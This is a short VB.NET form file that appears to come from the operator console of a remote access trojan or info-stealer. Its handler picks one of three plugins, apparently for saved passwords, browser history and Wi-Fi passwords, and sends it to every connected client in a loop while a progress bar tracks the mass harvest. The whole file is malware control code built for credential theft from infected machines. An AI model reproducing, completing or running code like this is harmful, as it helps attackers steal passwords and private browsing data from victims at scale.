Imports PacketLib.Packet

Public Class Mass_form
    Private Sub Mass_form_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub

    Private Async Sub Recover_BTN_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Close_BTN_Click(sender As Object, e As EventArgs) Handles Close_BTN.Click
        Me.Hide()
    End Sub

    Private Async Sub LaunchToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LaunchToolStripMenuItem.Click
        Custom_ProgressBar2.Value = 0
        Custom_ProgressBar2.Maximum = Dark.L.Count

        Dim P As New PacketMaker
        P.Type_Packet = PacketType.PLUGIN

        Dim ID_CMD As Integer = CMD_ListView.SelectedItems(0).Index

        Select Case ID_CMD
            Case 0
                P.Plugin = Plugins._PW

            Case 1
                P.Plugin = Plugins._WB
            Case 2
                P.Plugin = Plugins._W_PW
        End Select

        For Each U As Clients In Dark.L

            If ID_CMD = 0 Then

                U.Main_Form.Loading_PW.Visible = True
                U.Main_Form.Loading_PW.Active = True

            ElseIf ID_CMD = 1 Then

                U.Main_Form.Loading_Hist.Visible = True
                U.Main_Form.Loading_Hist.Active = True
            Else

                U.Main_Form.Loading_W_PW.Visible = True
                U.Main_Form.Loading_W_PW.Active = True

            End If

            '    Await Task.Run(Sub() Helpers.Sender(U, P))
            Await Task.Run(Sub() U.Sender(P))

            Custom_ProgressBar2.Value += 1

        Next
    End Sub
End Class